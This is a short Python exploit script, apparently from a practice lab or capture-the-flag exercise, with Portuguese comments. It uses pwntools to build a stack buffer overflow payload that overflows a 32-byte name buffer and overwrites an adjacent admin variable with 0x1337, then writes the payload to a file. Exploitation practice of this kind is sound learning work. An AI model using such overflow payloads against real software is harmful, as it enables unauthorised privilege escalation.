from pwn import p64

# Primitiva: sobrescrever a variavel adjacente `admin`.
# 32 bytes enchem name[32]; os 8 bytes seguintes caem sobre admin.
payload = b"A" * 32 + p64(0x1337)
open("/home/hacker/payload.bin", "wb").write(payload)
